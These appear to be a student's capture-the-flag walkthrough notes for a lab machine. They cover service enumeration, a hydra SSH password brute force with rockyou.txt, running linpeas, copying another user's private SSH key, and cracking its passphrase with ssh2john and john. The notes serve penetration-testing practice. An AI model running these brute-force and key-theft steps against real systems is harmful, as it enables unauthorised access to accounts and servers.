## Machine Details
ipaddr=10.10.250.159

## Pre Reqs


## Enumeration
Find open services.
trying nmap using 

```nmap $ip -vvv -sC -sV -oN nmap-output.txt```
```
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?      syn-ack
8080/tcp open  http-proxy  syn-ack
```

BASIC-2 hostname 

using dirbuster for directories
```
dirbuster -u http://10.10.250.159 -l /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r
```

## TASK 
use user brute-forcing to find the username and password.

navigated to /development

2 files
- dev.txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
- j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
SSH is open (22)

clearly /etc/shadow is relevant.

running enum4linux

checking output... 

usernames found

```
jan
kay
```

## find credentials
Use hydra to brute ssh with the rockyou.txt wordlist
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.250.159 ssh
```

with found password login as user

time to enum on the box itself

try ```cat /etc/shadow``` 
no permissions
```
ls -la 
cat .lesshst
```
no permissions

### enumerate with linpeas

use scp to copy over linpeas.sh as box has not internet access

copy to location jan has privileges to

```scp /share/tryhackme/tools/linpeas/linpeas.sh jan@10.10.250.159:/dev/shm```

```./linpeas.sh | tee lin.txt```

Look for interesting stuff, check exploits, ssh keys etc

always check if you can access .ssh in home directories
```
cat id_rsa
```
save on local machine

set permissions to ```600``` on key

try ```ssh -i ssh/kay_idrsa kay@10.10.250.159```

passphrase required.

use ssh2john to get the hash of the ssh key
```
ssh2john ssh/kay_idrsa > kayhash.txt 
```

use john to crack the hash, use rockyou wordlist again
```
john kayhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

ssh again with the found password

get the flag